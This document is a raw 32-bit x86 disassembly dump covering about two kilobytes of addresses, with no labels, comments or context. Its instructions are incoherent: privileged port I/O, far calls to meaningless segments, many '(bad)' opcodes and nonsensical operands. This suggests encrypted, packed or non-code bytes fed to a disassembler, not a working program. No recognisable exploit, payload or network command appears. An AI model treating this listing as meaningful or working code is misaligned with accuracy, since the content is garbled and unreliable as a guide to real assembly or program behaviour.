  4232ff:	inc    edi
  423300:	fsubr  DWORD PTR [ecx-0x7e]
  423303:	dec    esi
  423304:	or     edx,DWORD PTR [esi]
  423306:	mov    esi,0xd0c52d2
  42330b:	pop    edi
  42330c:	aam    0xa9
  42330e:	xor    cl,BYTE PTR [edi+0x45]
  423311:	das    
  423312:	cmp    eax,0x3694f94
  423317:	dec    eax
  423318:	ins    BYTE PTR es:[edi],dx
  423319:	js     0x42333b
  42331b:	fst    DWORD PTR es:0xb5c5ea06
  423322:	push   es
  423323:	call   0xf3b3:0xc8064cae
  42332a:	mov    ecx,0xaf5d4934
  42332f:	xor    eax,0xe93fb32c
  423334:	sub    DWORD PTR [esi+0x4d],edx
  423337:	xchg   edx,eax
  423338:	test   eax,0x5693db80
  42333d:	inc    edx
  42333e:	ins    DWORD PTR es:[edi],dx
  42333f:	ja     0x4232d4
  423341:	arpl   WORD PTR [edx+0x2dc0fb55],sp
  423347:	sub    esp,esp
  423349:	sub    al,0x51
  42334b:	cs mov cl,0x89
  42334e:	loop   0x4233ae
  423350:	inc    esi
  423352:	xchg   BYTE PTR [ebp-0x76],dl
  423355:	sbb    ecx,eax
  423357:	in     eax,dx
  423358:	icebp  
  423359:	iret   
  42335a:	lock mov cl,0x80
  42335d:	jae    0x423377
  42335f:	stos   BYTE PTR es:[edi],al
  423360:	xor    eax,0xc23ba715
  423365:	jb     0x4233c2
  423367:	dec    edi
  423368:	lea    edi,[ebx]
  42336a:	ja     0x42334f
  42336c:	sub    eax,0x85e9d905
  423371:	arpl   WORD PTR [ebp+0x27],si
  423374:	add    al,0x28
  423376:	mov    al,ds:0x9c4c6a28
  42337b:	sahf   
  42337c:	loop   0x423317
  42337e:	dec    edi
  42337f:	in     al,0xa0
  423381:	xor    BYTE PTR [edi],cl
  423383:	or     eax,0xd14e65f2
  423388:	(bad)  
  423389:	aaa    
  42338a:	jle    0x4233cc
  42338c:	sbb    ecx,edx
  42338e:	mov    bl,0x99
  423390:	xchg   edi,eax
  423391:	inc    edx
  423392:	add    BYTE PTR [ebp+0x1bfd714],bh
  423398:	fucom  st(0)
  42339a:	aad    0x54
  42339c:	inc    esi
  42339d:	push   ss
  42339e:	aaa    
  42339f:	call   0x7a82:0x5bc4c7ea
  4233a6:	cmp    BYTE PTR [edx+0x28a501ae],ch
  4233ac:	daa    
  4233ad:	mov    ch,0x9f
  4233af:	jg     0x42337f
  4233b1:	xor    BYTE PTR [esp+eax*4+0x2a],ch
  4233b5:	lahf   
  4233b6:	add    ebx,ebp
  4233b8:	in     eax,0x94
  4233ba:	shl    BYTE PTR [ebp+0x1a555e02],1
  4233c0:	lock jo 0x4233d2
  4233c3:	mov    bl,0x64
  4233c5:	push   esp
  4233c6:	xchg   ebp,eax
  4233c7:	push   ebx
  4233c8:	add    eax,0xe9970060
  4233cd:	scas   al,BYTE PTR es:[edi]
  4233ce:	in     al,0xab
  4233d0:	pop    esi
  4233d1:	es push ebp
  4233d3:	lahf   
  4233d4:	call   0xb296:0xbde0f6bf
  4233db:	pushf  
  4233dc:	pop    ecx
  4233dd:	pop    eax
  4233de:	adc    ah,ah
  4233e0:	inc    edi
  4233e1:	call   DWORD PTR [ecx+0x74]
  4233e4:	inc    ecx
  4233e5:	es cld 
  4233e7:	aas    
  4233e8:	les    ecx,FWORD PTR [edx+0x23]
  4233eb:	data16 sbb BYTE PTR [edi+0x6b],dl
  4233ef:	retf   0x53f6
  4233f2:	clc    
  4233f3:	lock adc al,0x80
  4233f6:	data16 aam 0xf3
  4233f9:	xor    esp,edx
  4233fb:	and    al,0x75
  4233fd:	jmp    0x41f7:0x81cae0f7
  423404:	mov    bh,0x33
  423406:	mov    eax,ds:0x24bdd9bd
  42340b:	push   edi
  42340c:	mov    WORD PTR ds:0x96b8465b,ss
  423412:	xor    eax,0x4c904f71
  423417:	and    cl,BYTE PTR [ebx-0x21528166]
  42341d:	test   esp,edi
  42341f:	pop    edx
  423420:	pop    es
  423421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423422:	xchg   BYTE PTR [ecx-0x63],bh
  423425:	rcl    dh,cl
  423427:	jae    0x423490
  423429:	popf   
  42342a:	lods   eax,DWORD PTR ds:[esi]
  42342b:	or     al,0xc5
  42342d:	xchg   edx,eax
  42342e:	or     BYTE PTR [edi+0x516e8d22],0x45
  423435:	jmp    0x4234ae
  423437:	push   es
  423438:	pop    esp
  423439:	and    edi,ecx
  42343b:	lods   eax,DWORD PTR ds:[esi]
  42343c:	xchg   ebx,eax
  42343d:	sbb    ecx,DWORD PTR [eax-0x74a9b99a]
  423443:	and    ah,BYTE PTR [ebx+0x77]
  423446:	dec    ecx
  423447:	dec    eax
  423448:	out    dx,al
  423449:	push   ecx
  42344a:	sahf   
  42344b:	inc    esp
  42344c:	dec    edx
  42344d:	sbb    BYTE PTR [eax],bl
  42344f:	adc    eax,0x4bcdf60
  423454:	lfs    ebx,FWORD PTR [edx+edx*4-0x40]
  423459:	in     eax,0x9e
  42345b:	pop    ss
  42345c:	inc    esi
  42345d:	push   ebp
  42345e:	out    0xf0,al
  423460:	xlat   BYTE PTR ds:[ebx]
  423461:	stc    
  423462:	or     eax,0x3e42a7b7
  423467:	mov    WORD PTR [ebx+0x6f87f33a],fs
  42346d:	in     al,0xae
  42346f:	adc    eax,0x93535ac5
  423474:	rcr    BYTE PTR [edx+0x516bf4c4],cl
  42347a:	loopne 0x4234aa
  42347c:	cmp    al,0x9
  42347e:	bound  ebx,QWORD PTR [edi+0x3e]
  423481:	dec    ecx
  423482:	xor    DWORD PTR [bx+di-0x2c],ebx
  423486:	aaa    
  423487:	and    al,0x47
  423489:	mov    bl,0x4d
  42348b:	rol    al,0xf1
  42348e:	fld    DWORD PTR [ebp+0x1d]
  423491:	inc    esi
  423492:	pop    es
  423493:	bound  edx,QWORD PTR [eax+0x2843fded]
  423499:	lods   al,BYTE PTR ds:[esi]
  42349a:	mov    ebx,0xd7c918c8
  42349f:	xor    ecx,DWORD PTR [edi]
  4234a1:	pop    esp
  4234a2:	add    eax,DWORD PTR [ebx]
  4234a4:	jbe    0x4234d2
  4234a6:	clc    
  4234a7:	cmp    ebp,DWORD PTR [ebx-0x6e]
  4234aa:	adc    eax,0xe3fb0ed6
  4234af:	sahf   
  4234b0:	call   0x70327853
  4234b5:	xor    cl,0xed
  4234b8:	mov    ah,0x80
  4234ba:	pushf  
  4234bb:	mov    dl,BYTE PTR [ecx-0x1e]
  4234be:	shl    BYTE PTR [eax+0x24807c96],cl
  4234c4:	mov    eax,0x565f39f9
  4234ca:	es xchg ebx,eax
  4234cc:	out    0x96,al
  4234ce:	test   DWORD PTR [ebp+0x4d],edi
  4234d1:	sbb    ch,BYTE PTR [eax]
  4234d3:	inc    esi
  4234d4:	jbe    0x423456
  4234d6:	cmp    DWORD PTR cs:[ecx+0x3],ebx
  4234da:	je     0x4234e1
  4234dc:	stc    
  4234dd:	jmp    0xa222:0x28fea5c3
  4234e4:	sbb    esp,esi
  4234e6:	inc    ebx
  4234e7:	xchg   BYTE PTR [edx+0x77],cl
  4234ea:	mov    BYTE PTR [eax],ah
  4234ec:	into   
  4234ed:	pop    eax
  4234ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234ef:	fsubr  st(0),st
  4234f1:	es pop eax
  4234f3:	cdq    
  4234f4:	out    dx,eax
  4234f5:	push   eax
  4234f6:	mov    ?,edi
  4234f8:	jbe    0x423518
  4234fa:	mov    edi,0x3afb2215
  4234ff:	mov    bl,0x82
  423501:	xchg   edi,eax
  423502:	or     BYTE PTR [esi],0xa8
  423505:	ds loopne 0x4234e4
  423508:	outs   dx,DWORD PTR ds:[esi]
  423509:	push   ds
  42350a:	neg    BYTE PTR [eax-0x33e262b4]
  423510:	xchg   ebx,eax
  423511:	test   al,0xdb
  423513:	stos   DWORD PTR es:[edi],eax
  423514:	bound  edi,QWORD PTR [edx-0x2b748053]
  42351a:	les    esp,FWORD PTR [ecx+ecx*2+0x4f1c4e76]
  423521:	fcomp  QWORD PTR [edx-0x49925015]
  423527:	nop
  423528:	sub    ebx,ebx
  42352a:	fidivr WORD PTR gs:[edi]
  42352d:	mov    bl,0x2c
  42352f:	jno    0x42352f
  423531:	jge    0x4235a0
  423533:	cwde   
  423534:	js     0x4234e3
  423536:	imul   BYTE PTR [ebp-0x15fe9f35]
  42353c:	adc    al,0x4d
  42353e:	mov    esi,0x366cf8db
  423543:	dec    eax
  423544:	mov    esp,0xf569c8ed
  423549:	jp     0x42359f
  42354b:	xchg   ebp,eax
  42354c:	and    BYTE PTR [edx-0xa],dh
  42354f:	retf   
  423550:	mov    dl,0xcc
  423552:	sar    edi,0x7
  423555:	arpl   WORD PTR [esi+eiz*2],bx
  423558:	pushf  
  423559:	pop    ds
  42355a:	inc    eax
  42355b:	pop    ebp
  42355c:	sahf   
  42355d:	xchg   ecx,eax
  42355e:	ins    DWORD PTR es:[edi],dx
  42355f:	lahf   
  423560:	ins    BYTE PTR es:[edi],dx
  423561:	test   DWORD PTR [esi-0x268c5a7c],ebp
  423567:	(bad)  
  423568:	(bad)  
  423569:	push   edi
  42356a:	sbb    eax,0x2671413d
  42356f:	sbb    eax,0xf73d9543
  423574:	enter  0x4b39,0x31
  423578:	nop
  423579:	ret    0x182b
  42357c:	jne    0x423524
  42357e:	fild   WORD PTR [ebx]
  423580:	test   al,0xc1
  423582:	dec    ebp
  423583:	test   BYTE PTR ds:0x7748382c,bl
  423589:	cs out 0x7a,eax
  42358c:	idiv   ch
  42358e:	mov    ebp,0xa74c5f6e
  423593:	sahf   
  423594:	stc    
  423595:	aaa    
  423596:	mov    ch,0xf5
  423598:	(bad)  
  423599:	pusha  
  42359a:	inc    esi
  42359b:	pop    edx
  42359c:	in     eax,dx
  42359d:	popf   
  42359e:	sub    esp,ebp
  4235a0:	pop    ss
  4235a1:	stos   BYTE PTR es:[edi],al
  4235a2:	into   
  4235a3:	nop
  4235a4:	(bad)  
  4235a6:	call   0x56d60dbb
  4235ab:	xchg   esp,eax
  4235ac:	cdq    
  4235ad:	xor    DWORD PTR [ebx+eax*4],edi
  4235b0:	sub    al,0x8
  4235b2:	test   BYTE PTR [esi-0x2f],0xdb
  4235b6:	(bad)  
  4235b7:	js     0x423608
  4235b9:	shl    BYTE PTR [ebp-0x5c],0x3b
  4235bd:	push   esi
  4235be:	lahf   
  4235bf:	mov    ah,0x0
  4235c1:	sahf   
  4235c2:	mov    dl,0xd2
  4235c4:	push   ecx
  4235c5:	mov    cl,0x11
  4235c7:	loopne 0x4235df
  4235c9:	xor    DWORD PTR [eax+ebp*1+0x5161a35a],0xffffffcf
  4235d1:	nop
  4235d2:	jge    0x4235b2
  4235d4:	push   cs
  4235d5:	jmp    0x4235d2
  4235d7:	pop    ebp
  4235d8:	or     al,0xe8
  4235da:	je     0x42357d
  4235dc:	and    BYTE PTR [esi],0x26
  4235df:	stc    
  4235e0:	and    eax,0xafb37c1a
  4235e5:	or     ebp,DWORD PTR [ecx-0x36]
  4235e8:	dec    ecx
  4235e9:	(bad)  
  4235ea:	retf   
  4235eb:	jno    0x423593
  4235ed:	(bad)  
  4235ee:	(bad)  
  4235ef:	cmp    eax,0xbf65e13b
  4235f4:	mov    edi,0x19b34629
  4235f9:	push   esi
  4235fa:	imul   edx,DWORD PTR [edi],0x43aab371
  423600:	dec    ebx
  423601:	mov    cl,0xfe
  423603:	jo     0x423599
  423605:	mov    DWORD PTR [ecx+0x52bdead2],edx
  42360b:	adc    al,0x45
  42360d:	fidivr WORD PTR [ecx+0x3f08ba73]
  423613:	cli    
  423614:	mov    al,0x5e
  423616:	xchg   BYTE PTR [ebp+0x50d6937a],dl
  42361c:	xor    al,0x9d
  42361e:	push   ecx
  42361f:	mov    dl,bl
  423621:	sbb    bh,0x7b
  423624:	pusha  
  423625:	das    
  423626:	pop    edx
  423627:	jle    0x42365c
  423629:	retf   
  42362a:	jecxz  0x42366d
  42362c:	outs   dx,BYTE PTR ds:[esi]
  42362d:	or     eax,0x98248394
  423632:	pop    ecx
  423633:	sti    
  423634:	push   0xbb08ac34
  423639:	in     eax,0xaf
  42363b:	pop    edx
  42363c:	xor    al,0x45
  42363e:	cmc    
  42363f:	stc    
  423640:	mov    eax,0x1c930790
  423645:	pop    es
  423646:	and    esi,esp
  423648:	or     al,0x26
  42364a:	mulps  xmm3,xmm5
  42364d:	sub    DWORD PTR [eax-0x44e519ee],0x5d
  423654:	ror    edi,cl
  423656:	aas    
  423657:	out    0xc7,al
  423659:	(bad)  
  42365a:	pop    esp
  42365b:	adc    al,0x92
  42365d:	mov    bl,0xb1
  42365f:	cmp    al,0x81
  423661:	inc    DWORD PTR [ecx-0x108bd492]
  423667:	std    
  423668:	fnsave [ebp+0x20bf3fc2]
  42366e:	xlat   BYTE PTR ds:[ebx]
  42366f:	xor    DWORD PTR [edi+0x2d],ecx
  423672:	cmc    
  423673:	and    BYTE PTR [edi-0x6ea2bdb9],bh
  423679:	mov    ebp,0x670e11b8
  42367e:	jp     0x4236f6
  423680:	and    al,0x1f
  423682:	jmp    0xb098:0xfd83cce9
  423689:	fsubr  DWORD PTR [ebx]
  42368b:	xor    al,0xf5
  42368d:	dec    eax
  42368e:	sub    esp,DWORD PTR [ebp+0x2b]
  423691:	add    dl,BYTE PTR [ecx+0x720706bf]
  423697:	inc    eax
  423698:	repz mov bh,0x30
  42369b:	stc    
  42369c:	lods   eax,DWORD PTR ds:[esi]
  42369d:	jnp    0x4236ed
  42369f:	out    0xe5,eax
  4236a1:	das    
  4236a2:	out    dx,al
  4236a3:	bound  edx,QWORD PTR [ebp+ebx*8+0x35b26fb2]
  4236aa:	ret    0x336f
  4236ad:	mov    edi,0xb1df3b
  4236b2:	sub    eax,0x5dec20ec
  4236b7:	sbb    eax,0x190dc48a
  4236bc:	ret    
  4236bd:	out    0xec,al
  4236bf:	push   0xc4086d8e
  4236c4:	mov    al,ds:0x313373b8
  4236c9:	cmp    al,0x5d
  4236cb:	and    al,0x1f
  4236cd:	inc    ebx
  4236ce:	repnz mov ds:0xd230a95c,eax
  4236d4:	cli    
  4236d5:	pop    es
  4236d6:	and    al,0x2a
  4236d8:	xchg   edx,eax
  4236d9:	sub    BYTE PTR [ebx-0x5d161b0e],ah
  4236df:	push   edx
  4236e0:	loope  0x4236bc
  4236e2:	outs   dx,BYTE PTR ds:[esi]
  4236e3:	cmp    ah,BYTE PTR [eax]
  4236e5:	ficom  DWORD PTR [eax+edi*4-0x65f80db2]
  4236ec:	outs   dx,BYTE PTR ds:[esi]
  4236ed:	ss sar eax,0x6
  4236f1:	nop
  4236f2:	xlat   BYTE PTR ds:[ebx]
  4236f3:	push   esi
  4236f4:	push   es
  4236f5:	mov    al,0x6c
  4236f7:	mov    al,0x9d
  4236f9:	mov    ebp,0xbcf94fd
  4236fe:	or     ebp,DWORD PTR [ebx+0x7c]
  423701:	and    dh,BYTE PTR [ecx-0x54]
  423704:	hlt    
  423705:	shl    BYTE PTR [eax+0x20760fef],cl
  42370b:	xchg   esi,eax
  42370c:	pop    es
  42370d:	test   BYTE PTR ds:0xfb816d48,ah
  423713:	rcr    DWORD PTR [eax+0x4e],0x49
  423717:	lock mov eax,0xd1d15a9b
  42371d:	xor    ah,ch
  42371f:	std    
  423720:	cmp    ah,BYTE PTR [edi]
  423722:	ret    0x6d05
  423725:	hlt    
  423726:	pop    es
  423727:	push   ebp
  423728:	sbb    ecx,DWORD PTR [ebp-0x56]
  42372b:	and    al,0xf1
  42372d:	stos   BYTE PTR es:[edi],al
  42372e:	xchg   esi,eax
  42372f:	lahf   
  423730:	loop   0x4236e3
  423732:	or     al,0xcc
  423734:	pop    eax
  423735:	out    dx,eax
  423736:	mov    dh,0xe0
  423738:	mov    ds:0xe1174227,eax
  42373d:	add    ebp,DWORD PTR [eax+0x77]
  423740:	fmul   QWORD PTR [ebp+0x2b]
  423743:	fs nop
  423745:	pop    ds
  423746:	cdq    
  423747:	mov    BYTE PTR [eax+edx*8-0x5e3fcf1c],0x1f
  42374f:	ins    DWORD PTR es:[edi],dx
  423750:	jge    0x4237bf
  423752:	rcl    ebp,cl
  423754:	mov    ebx,0x395d77bd
  423759:	xor    esi,DWORD PTR [eax]
  42375b:	dec    ebx
  42375c:	jb     0x4236e4
  42375e:	rol    DWORD PTR [ebp+0x70],cl
  423761:	pop    edi
  423762:	fmul   DWORD PTR [edx-0x2b66b29a]
  423768:	fdiv   DWORD PTR [edi+0x9]
  42376b:	(bad)  
  42376c:	and    eax,0x548f5307
  423771:	popa   
  423772:	jno    0x4237f3
  423774:	add    eax,0x55b434a4
  423779:	mov    bl,0x2d
  42377b:	push   0x9f4ea399
  423780:	jo     0x423718
  423782:	push   es
  423783:	jns    0x4237a4
  423785:	scas   eax,DWORD PTR es:[edi]
  423786:	adc    bh,BYTE PTR [eax]
  423788:	dec    bp
  42378a:	frstor [ebp-0x1f038705]
  423790:	repz push 0x22
  423793:	out    0xa2,eax
  423795:	sub    al,0x55
  423797:	jg     0x423748
  423799:	adc    BYTE PTR [eax+0x24c781bd],ah
  42379f:	inc    eax
  4237a0:	jecxz  0x423770
  4237a2:	mov    esi,0x5758ef8a
  4237a7:	mov    eax,ds:0x9ea21717
  4237ac:	inc    ebp
  4237ad:	sub    BYTE PTR [esi],ch
  4237af:	jle    0x4237ef
  4237b1:	aaa    
  4237b2:	push   ebp
  4237b3:	mov    ds:0x433d3436,eax
  4237b8:	sub    eax,0x343dd425
  4237bd:	(bad)  
  4237be:	fstp   DWORD PTR [ebp-0x3]
  4237c1:	ror    BYTE PTR [ecx-0x35],0xf3
  4237c5:	pop    eax
  4237c6:	mov    ebx,0xe5dc0fa2
  4237cb:	sbb    al,0xf7
  4237cd:	out    dx,al
  4237ce:	xor    al,al
  4237d0:	(bad)  
  4237d1:	aas    
  4237d2:	inc    edx
  4237d3:	or     al,0xc4
  4237d5:	adc    edx,DWORD PTR [esi+edi*2+0xa]
  4237d9:	std    
  4237da:	xor    BYTE PTR [edx+0x5a1efd5b],0x5c
  4237e1:	(bad)  
  4237e2:	ins    DWORD PTR es:[edi],dx
  4237e3:	(bad)  
  4237e4:	js     0x423855
  4237e6:	push   es
  4237e7:	mov    ch,0xe5
  4237e9:	gs out 0x5a,al
  4237ec:	(bad)  
  4237ed:	repnz push esi
  4237ef:	pop    ebx
  4237f0:	sbb    bl,BYTE PTR [esp+ebx*4+0x543b44dd]
  4237f7:	pop    eax
  4237f8:	mov    eax,ecx
  4237fa:	adc    eax,0xe180a3d1
  4237ff:	stc    
  423800:	mov    ds:0x1de119ac,al
  423805:	jno    0x423819
  423807:	jge    0x4237d9
  423809:	mov    edx,cs
  42380b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42380c:	call   DWORD PTR [ecx+0x70]
  42380f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423810:	inc    eax
  423811:	sub    esp,DWORD PTR [edx+0x3c]
  423814:	sub    al,ah
  423816:	pop    ss
  423817:	cmp    BYTE PTR [eax],0xf
  42381a:	leave  
  42381b:	or     ah,BYTE PTR [edi+0x5b]
  42381e:	test   al,ch
  423820:	aaa    
  423821:	jnp    0x42389b
  423823:	in     al,dx
  423824:	jmp    0x9d35bd7b
  423829:	test   edi,esp
  42382b:	clc    
  42382c:	shl    DWORD PTR [eax-0x74562578],1
  423832:	adc    eax,0x9c462db4
  423837:	into   
  423838:	fmul   st,st(7)
  42383a:	push   cs
  42383b:	jo     0x423898
  42383d:	mov    WORD PTR [ecx],fs
  42383f:	lock xchg ebx,eax
  423841:	pop    ecx
  423842:	es cli 
  423844:	mov    ah,0xfb
  423846:	mov    ebp,0x486ce51c
  42384b:	neg    DWORD PTR [ebp+ebp*2+0x2e]
  42384f:	inc    edi
  423850:	lds    esi,FWORD PTR [edx-0x31aace42]
  423856:	mov    ch,0x6e
  423858:	in     eax,0x7b
  42385a:	sar    BYTE PTR [ebx+0x62bfef9c],1
  423860:	add    ch,BYTE PTR [ebx-0x69]
  423863:	jg     0x42382f
  423865:	mov    bl,0xb2
  423867:	xor    eax,0x9680d686
  42386c:	push   edi
  42386d:	fbstp  TBYTE PTR [eax]
  42386f:	js     0x4237ff
  423871:	cld    
  423872:	bound  ecx,QWORD PTR [edx]
  423874:	pop    ebp
  423875:	loopne 0x423885
  423877:	and    DWORD PTR [esi+0x30],ebp
  42387a:	jecxz  0x423821
  42387c:	mov    eax,0x9fce7c2e
  423881:	shr    ah,1
  423883:	loopne 0x42388e
  423885:	bound  ebx,QWORD PTR [edi+eax*8+0x59]
  423889:	vpaddsw xmm0,xmm1,XMMWORD PTR [esi+0x3fd70ffb]
  423891:	out    0x4e,al
  423893:	xor    al,0x1e
  423895:	mov    ah,0xfd
  423897:	aam    0x93
  423899:	js     0x423835
  42389b:	loopne 0x423856
  42389d:	and    al,0x87
  42389f:	or     ecx,esp
  4238a1:	(bad)  
  4238a2:	enter  0x5b3f,0xf9
  4238a6:	mov    bh,0x54
  4238a8:	dec    esi
  4238a9:	mov    bl,0x61
  4238ab:	mov    esp,gs
  4238ad:	call   0x41c3d4bb
  4238b2:	xchg   edi,eax
  4238b3:	ds mov dl,0x83
  4238b6:	(bad)  
  4238b7:	mov    dh,0x45
  4238b9:	jnp    0x423930
  4238bb:	mov    BYTE PTR [ebx-0x14],al
  4238be:	xchg   ebx,ecx
  4238c0:	out    0x74,al
  4238c2:	or     DWORD PTR [edx-0x6f],0xbdff95d
  4238c9:	out    0x51,eax
  4238cb:	inc    ebx
  4238cc:	or     al,0xf0
  4238ce:	cwde   
  4238cf:	add    DWORD PTR [ebp+0x35b78483],edi
  4238d5:	setb   BYTE PTR [ecx+0x61577ba5]
  4238dc:	and    al,0x7b
  4238de:	pop    ebp
  4238df:	inc    ecx
  4238e0:	dec    edi
  4238e1:	dec    edx
  4238e2:	or     al,0xa4
  4238e4:	cmp    esp,esi
  4238e6:	inc    ebx
  4238e7:	inc    ecx
  4238e8:	push   esp
  4238e9:	retf   
  4238ea:	or     edi,edx
  4238ec:	xor    edx,DWORD PTR [ecx+0x2c665935]
  4238f2:	pusha  
  4238f3:	xchg   ebp,eax
  4238f4:	test   eax,0xdf9cad2b
  4238f9:	and    BYTE PTR ds:0xbe6619cb,bl
  4238ff:	rcr    DWORD PTR [edx+0x0],0x0
	...
  423947:	add    BYTE PTR [eax],al
  423949:	aad    0x80
  42394b:	pusha  
  42394c:	cld    
  42394d:	jne    0x42394b
  42394f:	(bad)  [ecx+0x32bc8e94]
  423955:	es mov edi,0x217b9288
  42395b:	add    DWORD PTR [eax],eax
  42395d:	and    BYTE PTR [edi],al
  42395f:	add    BYTE PTR [eax],al
  423961:	cli    
  423962:	jne    0x42395e
  423964:	inc    ebx
  423965:	call   0x3d78ffc1
  42396a:	or     DWORD PTR [edi+0x5a],edx
  42396d:	adc    edi,ecx
  42396f:	dec    esi
  423970:	pushf  
  423971:	mov    bh,0x2d
  423973:	cmp    ch,ah
  423975:	sti    
  423976:	fld    QWORD PTR [eax+ebp*1-0x36f3ff4f]
  42397d:	popa   
  42397e:	sub    esi,DWORD PTR [edx]
  423980:	dec    esp
  423981:	popa   
  423982:	inc    esp
  423983:	or     al,0x8f
  423985:	mov    esp,0x86b387a0
  42398a:	mov    ss:0xd8d29946,eax
  423990:	mov    ebx,0x516e7623
  423995:	sub    cl,BYTE PTR [ecx+eax*8+0x40cd367c]
  42399c:	loopne 0x423a02
  42399e:	jl     0x423968
  4239a0:	dec    ebp
  4239a1:	fadd   DWORD PTR [eax-0x80]
  4239a4:	mov    bl,0xb3
  4239a6:	mov    dh,0x1c
  4239a8:	pop    es
  4239a9:	loopne 0x423932
  4239ab:	sbb    eax,0xd1a5cfb
  4239b0:	xlat   BYTE PTR ds:[ebx]
  4239b1:	icebp  
  4239b2:	inc    ebp
  4239b3:	aad    0xf
  4239b5:	adc    al,0x19
  4239b7:	imul   ebp,DWORD PTR [esi+0xb],0xffffff87
  4239bb:	mov    DWORD PTR [ecx+0x21],ecx
  4239be:	adc    esp,ecx
  4239c0:	daa    
  4239c1:	ja     0x4239e2
  4239c3:	inc    esp
  4239c4:	jnp    0x423959
  4239c6:	mov    ebx,0xc558a2b2
  4239cb:	mov    bl,0x99
  4239cd:	mov    ds:0x3b74af50,eax
  4239d2:	cmp    BYTE PTR [ecx+0x25a7ade5],dl
  4239d8:	loop   0x423a1c
  4239da:	pop    eax
  4239db:	cmc    
  4239dc:	cmp    ebp,ebx
  4239de:	mov    dh,0x79
  4239e1:	js     0x423a35
  4239e3:	xor    al,0x59
  4239e5:	retf   0xfcf2
  4239e8:	pop    edx
  4239e9:	nop
  4239ea:	or     edx,ebp
  4239ec:	mov    bl,0xaf
  4239ee:	xor    BYTE PTR [ebx+ebx*2-0x62],cl
  4239f2:	jecxz  0x4239b9
  4239f4:	pop    es
  4239f5:	repnz lahf 
  4239f7:	xor    al,0x61
  4239f9:	xor    eax,0x94296875
  4239fe:	rcl    BYTE PTR [ecx],cl
  423a00:	fdiv   DWORD PTR [edi]
  423a02:	mov    ebx,0xacd239b7
  423a07:	daa    
  423a08:	mov    ds:0xdb622608,al
  423a0d:	sub    al,0xb6
  423a0f:	aam    0x6d
  423a11:	call   0x927203a
  423a16:	jns    0x4239d7
  423a18:	ds dec ebx
  423a1a:	nop
  423a1b:	jl     0x4239bc
  423a1d:	cmp    esi,esi
  423a1f:	ss push ecx
  423a21:	test   eax,0xa2ee3bce
  423a26:	and    al,0xad
  423a28:	inc    esp
  423a29:	push   esp
  423a2a:	dec    edx
  423a2b:	stos   DWORD PTR es:[edi],eax
  423a2c:	inc    DWORD PTR [eax]
  423a2e:	pushf  
  423a2f:	inc    eax
  423a30:	sahf   
  423a31:	std    
  423a32:	pop    esi
  423a33:	or     ebp,DWORD PTR [ecx-0x68426c15]
  423a39:	xchg   edi,eax
  423a3a:	jmp    0xd536b4d2
  423a3f:	push   eax
  423a40:	repnz pop edx
  423a42:	mov    ds:0xf1013b5f,al
  423a47:	adc    cl,BYTE PTR [edi+0x473049fe]
  423a4d:	aas    
  423a4e:	push   edi
  423a4f:	nop
  423a50:	daa    
  423a51:	cmp    ebx,0xffffffb8
  423a54:	cs mov ebp,0x65cc8a06
  423a5a:	mov    ecx,0x77c2631a
  423a5f:	push   0x78
  423a61:	jmp    0x423a78
  423a63:	int    0xb5
  423a65:	das    
  423a66:	pop    es
  423a67:	xor    eax,ecx
  423a69:	aas    
  423a6a:	pop    ecx
  423a6b:	sahf   
  423a6c:	inc    esp
  423a6d:	iret   
  423a6e:	loop   0x423abd
  423a70:	push   cs
  423a71:	ror    BYTE PTR [esi-0x22eb1816],0x5f
  423a78:	retf   0xcdb2
  423a7b:	enter  0x6c6f,0x80
  423a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a80:	outs   dx,DWORD PTR ds:[esi]
  423a81:	jmp    0xeaf1:0xdd3d6d95
  423a88:	xlat   BYTE PTR ds:[ebx]
  423a89:	popa   
  423a8a:	and    al,0xef
  423a8c:	jb     0x423a16
  423a8e:	out    0xf4,al
  423a90:	push   ds
  423a91:	js     0x423a81
  423a93:	pop    esp
  423a94:	add    DWORD PTR [ebx-0x7c],ebp
  423a97:	scas   eax,DWORD PTR es:[edi]
  423a98:	dec    edx
  423a99:	test   eax,0x12b22c6d
  423a9e:	xor    al,0xb7
  423aa0:	mov    bh,0xe5
  423aa2:	fistp  QWORD PTR [ebx+0x13]
  423aa5:	mov    cl,dh
  423aa7:	call   0xbf07170e
  423aac:	jl     0x423a59
  423aae:	aad    0xe1
  423ab0:	dec    edi
  423ab1:	fs call 0xab00d51
  423ab7:	or     eax,0x79e0e0f7
  423abc:	pop    es
  423abd:	cli    
  423abe:	hlt    
  423abf:	arpl   WORD PTR [ebx-0x3c],di
  423ac2:	sub    esp,0x3a
  423ac5:	les    eax,FWORD PTR [ebx-0x9]
  423ac8:	push   ss
  423ac9:	lock add BYTE PTR [ebx+0x23],ch
  423acd:	jp     0x423b04
  423acf:	leave  
  423ad0:	das    
  423ad1:	sbb    al,0xba
  423ad3:	mov    ds:0xf2a5bebc,eax
  423ad8:	or     BYTE PTR [edi+0x47],ah
  423adb:	or     eax,0x96dd5a86
  423ae0:	mov    dh,ah
  423ae2:	inc    edi
  423ae3:	xchg   ah,al
  423ae5:	idiv   BYTE PTR [edx]
  423ae7:	push   edi
  423ae8:	xchg   ebx,eax
  423ae9:	test   BYTE PTR [edx],dh
  423aeb:	mov    esp,0x415e011d
  423af0:	jp     0x423af9
  423af2:	and    edi,0xfffffff0
  423af5:	shl    DWORD PTR [eax-0x24],cl
  423af8:	das    
  423af9:	(bad)  
  423afa:	jnp    0x423a7d
  423afc:	shl    esi,cl
  423afe:	mov    esi,0x481e1498
  423b03:	mov    ah,0x4a
  423b05:	test   eax,0xcf065f84
  423b0a:	sbb    al,0xc1
  423b0c:	iret   
  423b0d:	jmp    0x423b04
  423b0f:	das    
  423b10:	mov    cl,0xf4
  423b12:	repz out 0x9b,al
  423b15:	inc    ecx
  423b16:	and    al,0x22
  423b18:	pop    edx
  423b19:	mov    es,WORD PTR [ebp+0x2c]
  423b1c:	fnstcw WORD PTR [eax-0x71d37a0d]
  423b22:	popf   
  423b23:	retf   0x895e
  423b26:	or     al,0xd2
  423b28:	and    al,BYTE PTR [ecx]
  423b2a:	mov    cl,ah
  423b2c:	in     al,dx
  423b2d:	inc    ecx
  423b2e:	push   ecx
  423b2f:	jmp    0xe6fb3040
  423b34:	and    bh,ah
  423b36:	push   ebx
  423b37:	add    esi,DWORD PTR [edi+ebp*1+0x5f]
  423b3b:	mov    DWORD PTR [esi],esp
  423b3d:	rcl    DWORD PTR [ebx],1
